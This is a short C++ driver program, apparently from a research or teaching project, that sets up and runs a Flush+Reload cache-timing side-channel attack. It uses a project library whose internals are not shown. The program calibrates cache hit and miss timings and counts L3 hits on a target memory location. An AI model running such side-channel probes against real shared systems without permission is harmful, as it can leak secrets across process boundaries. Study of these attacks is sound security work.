//
// Created by nires on 29-Jul-19.
//

#include "../../Library/Measurements.h"
#include "../../Library/FRAttacker.h"
#include "../../Library/MemoryAccess.h"
#include <iostream>
#include <string.h>

using namespace std;

int main(int argc, char **argv){

    // set up arguments for the attack
    int accessCount = 0;
    int iterations = 100;
    int interval = 1;
    if(argc < 3 || argc > 5){
        cout << "WRONG USAGE: " << argv[0] << " path target [interval] [iterations]\n";
        return -1;
    }
    if(argc >= 4){
        interval = stoi(argv[3]);
    }
    if (argc == 5){
        iterations = stoi(argv[4]);
    }
    char *target = argv[2];

    // begin attack
    FRAttacker attack = FRAttacker(argv[1], target, strlen(target), interval, iterations);
    attack.Configure();
    cout << "In cache time: " << attack.GetMeasurements().GetInCacheTime() << endl;
    cout << "Not in cache time: " << attack.GetMeasurements().GetNoCacheTime() << endl;
    attack.Attack();
    for (auto& access : attack.GetMeasurements().GetAccessVector()){
        if (access.speculatedCache == Cache::L3)
        {
            accessCount++;
        }
    }
    return accessCount;
}